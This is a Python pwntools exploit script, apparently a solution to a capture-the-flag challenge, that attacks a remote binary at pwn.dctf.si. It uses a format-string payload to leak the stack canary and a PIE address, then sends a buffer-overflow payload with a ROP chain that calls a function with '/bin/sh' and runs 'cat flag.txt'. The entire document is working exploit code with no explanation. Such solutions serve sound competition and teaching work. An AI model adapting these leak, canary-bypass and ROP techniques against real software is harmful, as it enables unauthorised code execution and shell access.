#!/usr/bin/env python3

from pwn import *
from pwn import p64

path = "./chall/app"
exe = ELF(path)

io = remote("pwn.dctf.si", 13372)

# leak PIE and canary
payload = b"%11$p|%13$p"
io.sendlineafter(b"Username:", payload)
payload = b"B"
io.sendlineafter(b"Password:", payload)

leak = io.recvline().strip().decode().split(" ")[-1]
canary, pie_leak = leak.split("|")

canary = int(canary, 16)
info(f"{hex(canary) = }")
pie_leak = int(pie_leak, 16)
info(f"{hex(pie_leak) = }")

pie_base = pie_leak - exe.symbols["main"] - 24

rop = ROP(exe)
exe.address = pie_base
info(f"{hex(exe.address) = }")
info(f"{hex(exe.symbols['hospital']) = }")

chain = [
    pie_base + rop.rdi.address,
    0x1,
    pie_base + rop.rsi.address,
    0xdeadb33f,
    pie_base + rop.rdx.address,
    next(exe.search(b"/bin/sh")),
    pie_base + rop.ret.address,
    exe.symbols["hospital"]
]
info([hex(a) for a in chain])
chain = b"".join([p64(a) for a in chain])

padding = 13 * 8 * b"A"
payload = padding
payload += p64(canary)
payload += p64(0x0)
payload += chain
io.sendlineafter(b"already.", payload)

io.recvuntil(b"sir.\n")
io.sendline(b"cat flag.txt")
success(f"Flag: {io.recvline().strip().decode()}")
io.close()
# io.interactive()
